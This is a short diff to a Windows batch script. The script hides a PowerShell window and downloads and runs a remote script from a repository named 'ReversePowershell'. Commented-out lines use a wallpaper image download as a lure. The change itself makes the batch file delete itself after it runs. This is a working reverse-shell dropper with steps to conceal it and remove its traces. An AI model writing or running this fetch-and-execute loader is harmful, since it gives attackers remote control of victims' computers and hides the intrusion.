@@ -3,4 +3,4 @@ set scriptURL=https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/
 rem powershell -c "Invoke-WebRequest http://www.picturesnew.com/media/images/picture-wallpaper.jpg -OutFile ./pic.jpg"
 rem pic.jpg
 powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString('%scriptURL%')"
-rem del "%~f0"
+del "%~f0"
